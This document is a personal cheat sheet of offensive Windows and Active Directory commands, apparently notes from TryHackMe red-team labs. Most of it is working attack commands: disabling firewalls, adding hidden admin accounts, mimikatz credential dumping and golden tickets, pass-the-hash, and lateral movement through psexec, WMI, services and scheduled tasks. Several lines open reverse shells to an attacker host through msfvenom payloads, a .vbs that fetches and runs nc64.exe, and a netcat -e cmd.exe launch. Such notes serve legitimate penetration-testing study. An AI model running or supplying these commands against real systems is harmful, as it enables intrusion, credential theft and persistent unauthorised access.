# WINDOWS

# Commands
- systeminof
  - part of Active Directory (workgroup / domain)
- wmic = Windows Management Instrumentation Command-line
  - wmic qfe get Caption, Description = updates
  - wmic product get name,version,vendor
  - wmic service where "name like 'name'" get Name,Version,Pathname
  - **wmic** find users || dir /p datei.txt (find file) = find file
  - wmic /namespace:\\root\securitycenter2 path antivirusproduct (workstation) = find AV
  - - wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
    - find services not in folder c:\windows
    - find services without quotation marks
    - account for the service: sc qc SERVICE_NAME ==>local syste?


- Find AV
  - get-Process -Name
  - Get-CimInstance
  - Get-Servive WinDefend
  - Get-MpComputerStatus
  - get-Netfirewallprofile
  - get-ChildItem -Hidden -Path C:\Users\NANE
  - Test-NetConnection 

- Get-CimInstance
  - Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct (workstantion)
- Get-Servive WinDefend
- Get-MpComputerStatus
- get-Netfirewallprofile
- Test-NetConnection 
- net start = started services

- Firewalls
  - get-Netfirewallprofile | Format-table
  - set-netFirewallprofile -Profile NAME,nAME,NAMe, -enables Flase
  - | select Displayname, Enables, Description
  - get-netfirewallrulle | select Fields
  - get-MpThreat: findings by Denfender
  
- whoami 
  - /priv
  - /groups

- net 
  - user
  - group
  - localgroup [administrators]
  - accounts /domain
  - share

- ipconfig
  - /all

- netstat
  - -a all
  - -b binary connection
  - -n not resolving ip
  - -o PID
  - -l = listening
  - -t = tcp
  - -u = udp
  - -x = unix
  - -p = process id
  - find open ports

- Test Connection
  - Test-NetConnection / TCPClient
  - Test-NetConnection -ComputerName IP -Port

- get-EventLog -List
- sysmon: logger
  - get-Process | Where-Object  { $_.ProcessName -eq "Sysmon" }
  - Get-CimInstance win32_service -Filter "Description = 'System Monitor Service'"
  - Get-Service | where-object {$_.DisplayName -like "*sysm*"}
  - Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
  - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
  - findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*

- Services
  - wmic product get name,version
    - wmic service where "name like 'name'" get Name,Version,Pathname
  - get-ChildItem -Hidden -Path C:\Users\NANE
  - get-Process
    - -Name
  - netstat -noa
  - net start
  - nslookup

- findstr = grep
- Windows: get file 
- powershell -c Invoke-Webrequest -OutFile winPeas.exe http://10.8.80.130/file.ext
- powershell -c wget "http://10.8.80.130/Invoke-winPEAS.ps1" -outfile "winPEAS.ps1"

- check permision
  - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln

- powershell.exe
  
## Stabilize and Post Exploit windows
- Create user + add group admin
  - **net user USERNAME PASS /add**
  - **net localgroup Administrators/"Backup Operators"/"Remote Management Users"/"Remote Desktop Users" Username /add**
  
- User Account Control
  - Less privilege when logged in remotly
  -  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

- Assign BACKUP OPERATOR groups
  - secedit /export /cfg config.inf
    - SeBackupPrivilege
    - SeRestorePrivilege
    - secedit /import /cfg config.inf /db config.sdb
    - secedit /configure /db config.sdb /cfg config.inf

- Allow winRM
  - Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI

- Change registry values
  - defauld admin RID = 500
  - Regular users RID >= 1000
  - wmic useraccount get name,sid

# ACTIVE DIRECTORY DOMAIN SERVICE (AD DS)
- Definitions
  - Domain: group of users/computers under a adm
  - Domain Controler: server that runs AD. Provides AD services + control all
  - AD: repository/database where this users/computers are
  - Organizational Unit (OU): containers inside AD, classify user/machines. Apply policies
    - Group Policy Objects
      - network distribution: gpupdate /force
      - SYSVOL: shared networ
  - AD Domains: collection of components within AD
  
- Tree: several domains
- Forestr: domains trust each other
  - Union several trees + different namespace
  - Trust Relationshing
- Enterprese Admins: over all domains

- Objects
  - User:
    - People
    - Service: database, printer, service user
  - Machines
    - computer that joins AD domain
    - local administrator on machine self
    - password rotated + 120 characters
    - DC01 = machnie name | DC01$ = machine account name
  - Security Groups
    - groups and machines
    - Domain Admin, Server|Backup|Account Operators, Domain Users|COmputer|Controllers
    - grant permission over resources

- Credentials
  - Domain Controllers
    - Kerberos
    - NetNTLM

## KERBEROS
- authentication service
- ticket system
- Steps
  - Key Distribution Center (KDC) ==> generate Ticket Granting Ticket (TGT) ==> Ticket Granting Service
- Enumerate users
  - kerbrute userenum -d domain --dc domain string wordlist.txt
- Rubel.exe (in the victim's machine) to find hashes
- mimikatz for golden ticket
  - lsadump::lsa /inject /name:USERNAME
  - kerberos::golden /user:[logged_user] /domain:[name_domain] /sid: /krbtgt:[hash_des_Nutzers] /id:
  - msic::cmd ==> access other machine

## Commands
- Reset password
  - set-ADAccountPassword USER -Reset -NewPassword (Read-Host -AsSecurestring -Prompt '123456') - Verbose
  - Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose


### Credential Injection
- runas.exe
  - inject credential into memory
  - runas.exe /netonly /user:<domain>\<username> cmd.exe
  - check SYSVOL

## BREACHING
- Steps
  - get access to one account at least
  - enumerate once inside
  - phishing and OSINT

- Accounts
  - Builin/Administrator = local admin
  - Domain Admin: all resources
  - Entrepreise admin: forest root
  - schema admin: modify domain/forest
  - server operator: manage domain server
  - account operator: manage users

### NTLM
- New technology LAN Manager
- Challenge-Response - Net-NTLM
- security protocols for authentication
- password spraying (one password, several users)

### LDAP
- Lightweight Directory Access Protocol
- direct verify credentials
- Pass-back
  - rogue LDAP server
  - OpenLDAP: install slapd ldap-utils && sudo systemctl enable slapd
  - sudo dpkg-reconfigure -p low slapd
  - downgrade own ldap server
  - dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred

### Authentication Relays
- SMB = Server Message Block
  - Communication Client-Server on Microsoft AD

- Make client communicate to Rogue AD
  - send poisoned response
  - race condition
  - Responder ==> intercept connections (similar to wifi)

### MDT
- Microsoft Deployment Toolkit
  - deploy images
  - MSCCM = Microsoft System Center COnfiguration Manager = updates
- with PXE
  - *.bcd = info for PXE boot
  - Download those files
    - tftp -i IP GET "\Tmp\file.bcs" name
    - powershell -executionpolicy bypass
    - Import-Module .\PowerPXE.ps1
      - Get-WimFile -bcdFile file.conf ==> PXE boot image
    - Extract image
      - inject local admin
      - Exfiltrate credentials = Get-FindCredentials -WimFile FILE

### Config Files
- web config files
- service
- registry keys
- centrally deployed applications
- antivirus-files
  - sqlitebrowser file.db
- Tools
  - seatbelt: https://github.com/GhostPack/Seatbelt

## ENUMERATING
- With GUI:
  - xfreerdp /d:za.tryhackme.com /u:'kimberley.smith' /p:'Password!' /v:thmjmp1.za.tryhackme.com
  - Microsoft Management COnsole (MMC)
  
- cmd
  - net-command
  - net user /domain
    - net user.name /domain
  - net group /domain
    - net group "group-name" /domain
  - net accounts /domain = password policy
  
- Powershell
  - get-ADuser -Identity USER -Server SERVER -Properties *
    - -Filter 'Name -like "*smt"'
    - | Format-Table Name,Smt -A
  - get-ADGroup
  - Get-ADGroupMember
  - Get-ADObject
    - Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
  - get-Addomain
  - Change
    - set-ADAccountPassword

### BLOODHOUND
- Sharphound
  - Gather information
  - Sharphound.exe --CollectionMethods <Methods> --Domain za.tryhackme.com --ExcludeDCs
  - https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html

- Bloodhound: create graphic
  - graphical interface
  - https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html
- In the target:
  - Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
- in the attacker
  - neo4j console => database
  - bloodhound
    - import looted files

## Exploiting AD

### Delegating Permission
- Add account to group member
```
Add user to group ==> Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username" 

check group ==> Get-ADGroupMember -Identity "IT Support" 

Find users ==> Get-ADGroupMember -Identity "Tier 2 Admins"

Force Change Password:
- $Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
- Set-ADAccountPassword -Identity "t2_henry.shaw" -Reset -NewPassword $Password 

Connect to user
xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'t2.admin' /p:'newpass'
```



# COMMANDS
- systeminfo ==> command
  - Os config + Domain
  - Domain = AD
  - Workgroup = local workgroup
- getAdUser -Filter*
  - show all ad user account
  - -Searchbase "CN=Users,DC=THMREDTEAM,DC=COM"
    - Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM"

- port 139/445
- Enum4linux = Enumerate
- kerbrute = brute force in kerberus active directory
  - Find users
    - kerbrute userenum -d domain --dc ip word_list.txt
- Find user without password (NP)
  - GetNPUsers.py --no-pass -usersfiles {wordlist.txt} domain.com/ -dc-ip [IP-address]
- find other hashes
  - secretsdump.py -dc-ip ip host.local/user@ip
- Pass the hash
  - evil-winrm -i IP -u USERNAME -H hash



# PERSISTANCE
- Identify segemtns: vlans, dmz
- IDS, IPDS, Endpoint Detection and Response
- 
- Logs
  - sysmon: logger
    - get-Process | Where-Object  { $_.ProcessName -eq "Sysmon" }
    - Get-CimInstance win32_service -Filter "Description = 'System Monitor Service'"
    - Get-Service | where-object {$_.DisplayName -like "*sysm*"}
    - Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
    - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
    - findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*

- Enumerate services, hidden folders and process, shared files/printers

## POWERVIEW
- enumrate domains on windows
  - powershell -ep bypass ==> allow run script
  - . .\PowerView.ps1
- Get-ChildItem function: ==> commands
 - Introduction: https://medium.com/@browninfosecguy/an-introduction-to-powerview-bdfd953f2c4c
   - $scriptFunctions = Get-ChildItem function: | Where-Object { $currentFunctions -notcontains $_ }
   - $scriptFunctions | Format-Wide -Column 4
   - Get-NetDomainController
   - Get-DomainPoliciy
   - get-netuser | select-object displayname,samaccountname  
   - Get-UserProperties -Properties 
   - get-netcomputer
   - [help] get-command
   - get-help Get-NetComputer -examples
   - Get-NetGroupMember
   - Get-NetGPO  / Invoke-ShareFinder = shares


## create reverse shell
- msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
- use exploit/multi/handler
- use exploit/windows/local/persistence

# Lateral Movement
- move inside network within same privilege
- psexec.exe = execute process remotly
  - psexec.exe \\IP -u USER -p PAss -i COMMAND.exe
- Remote Management (WinRM)
  - web + powershellcommands
  - winrs.exe -u:USER -p:PASS -r:targetIP COMMAND
  - Powershell:
```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

Enter-PSSession -Computername TARGET -Credential $credential

Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

- Create service sc.exe
  - sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
  - sc.exe \\TARGET start THMservice
  - sc.exe \\TARGET stop THMservice
  - sc.exe \\TARGET delete THMservice
  - reverse shell get killed easy, we need msfvenom:
    - service executable != .exe
  - Spawhn shell
    - runas /netonly /user:USER cmd.exe
  - sc.exe \\thmiis.za.tryhackme.com create NAMESEVICE binPath= "%windir%\myservice.exe" start= auto
  - sc.exe \\thmiis.za.tryhackme.com start NAMESEVICE

- Scheduled Task
  - schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
  - schtasks /s TARGET /run /TN "THMtask1" 
  - schtasks /S TARGET /TN "THMtask1" /DELETE /F

## WMI
- Windows Management Instrumentation
  - Web based
  - Create PSCredential object:

```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

- WMI Sessiont
```
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

- Remote Process
  - 135/TCP, 49152-65535/TCP (DCERPC)
  - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
  - Group: Administrators
```
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

- Create services remotly
```
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}

# Create
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartServic

# handle
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

- Scheduled Task
```
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"


# Execute
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

- Installing MSI package
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

- Steps
  - create reverse shell: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.65.3 LPORT=4445 -f msi > myinstaller.msi  
  - send file: smbclient -c 'put myinstaller.msi' -U USERNAME -W ZA '//thmiis.za.tryhackme.com/admin$/' PASSWORD
- dddd    

```
PS C:\> $username = 't1_corine.waters';
PS C:\> $password = 'Korine.1994';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop

```
## Other Authentication Methods
- pass the hash
  - mimikatz OR LSASS memory for hashs
  - 
### MIMIKATZ
- Only local user of the machine
- dumping credentials   
- mimikatz.exe
  - privilege::debug ==> Check if we are admin
  - token::elevate
  - lsadump::sam ==> Hash from local SAM
  - sekurlsa::msv ==> Hash from LSASS memory
    -lsadump::lsa /patch 
- with the hash
  - token::revert ==> reestablish token privileges ~= runas /netonly
  - sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:".exe command"

### With Linux
- xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
- psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
- evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH

### Kerberos
- TGS: Ticket Granting Service ==> only for service
- TGT: Ticket Granting Ticket ==> request access to services ==> admin credentials
- mimikatz ==> access to ticket, not session key
  - privilege::debug
  - sekurlsa::tickets /export
  - inject ticket
    - kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
  - klist => check if injection was correct

### Overpass-the-hash / pass-the-key
- applied to kerberos
- we need a key ==> we dont need password
- privilege::debug
- sekurlsa::ekeys
- Reverse sheel:
  - sekurlsa::pth /user:Administrator /domain:za.tryhackme.com [/rc4_|_/aes128_|_aes256]:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"


### Abusing Behaviour
- find writables shares + put file with payload
```
# .vbs
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True

# .exe
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe

# no logged off RDP session
PsExec64.exe -s cmd.exe
query user
tscon SESSION_ID /dest:rdp-tcp#6

From Windows 2019 only with password
```
### Port Forwarding
- Comprimised host ==> jump box
- console usage
- REMOTE Port Forwarding
  - Tunnel from Compromised to Attacker
    - create user for tunnel
    - useradd tunneluser -m -d /home/tunneluser -s /bin/true
    - ssh tunneluser@ATTACKER -R 3389:ISOLATED_SERVER:3389 -N
      - -N => prevent client from requesting shell
      - _R => remote

- LOCAL Port FOrwarding
  - ssh tunneluser@attacker -L *:PORT_COMPROMISED:LOCAL_HOST:PORT_ON_ATTACKRR -N
    - *:PORT_LOCAL = local socket used by compromised
  - Open Port on compromised
    - netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80

- Socat
  - file in pivot
  - socat TCP4-LISTEN:1234,fork TCP4:TARGET:4321
  - Open PORT 1234 on the pivot
  - Firewall Rule
    - netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389

- Dynamic Port Forwarding
  - several connections
  - ssh tunneluser@attacker_ip -R 9050 -N
    - SOCK proxy on port 9050
    - proxychains (learn more about it) => same port as ssh